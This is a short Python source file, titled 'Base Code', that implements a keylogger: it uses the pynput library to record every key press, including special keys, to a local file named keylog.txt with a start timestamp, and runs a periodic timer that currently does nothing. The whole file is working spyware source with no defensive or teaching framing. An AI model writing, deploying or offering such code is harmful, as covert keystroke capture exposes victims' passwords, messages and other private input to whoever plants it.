# Base Code Written In Python

import pynput.keyboard
import threading
import os
from datetime import datetime

# Constants
LOG_FILE_PATH = "keylog.txt"
LOG_INTERVAL = 600  

if not os.path.exists(LOG_FILE_PATH):
    with open(LOG_FILE_PATH, "w") as file:
        file.write("Keylogger started at {}\n".format(datetime.now()))

def callback_function(key):
    with open(LOG_FILE_PATH, "a") as file:
        try:
            file.write(key.char)
        except AttributeError:
            if key == key.space:
                file.write(" ")
            else:
                file.write(str(key))
        file.write("\n") 

def periodic_function():
    timer_object = threading.Timer(LOG_INTERVAL, periodic_function) 
    timer_object.start()

periodic_function()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

with keylogger_listener:
    keylogger_listener.join()
